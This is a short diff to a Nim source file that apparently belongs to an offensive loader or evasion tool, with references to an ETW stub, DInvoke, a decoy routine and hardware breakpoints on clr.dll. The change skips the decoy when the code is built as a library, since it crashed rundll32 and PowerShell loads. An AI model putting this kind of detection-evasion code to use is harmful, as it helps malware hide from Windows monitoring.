@@ -1618,8 +1618,10 @@ let ETWStub * = """
       var randomNumber = rand.Next()
       when defined(verbose):
         echo randomNumber
+    # This function leads to a process crash for Powershell as well as for DLLs loaded via rundll32.exe or else. Who knows why, but we'll therefore remove it which leads to us not being able to set a Hardware Breakpoint for the clr.dll Thread.
     when not defined(powershell):
-        Decoy()
+        when not defined(lib_only):
+            Decoy()
     when defined(DInvoke):
         discard MySleep(1500)
     else:
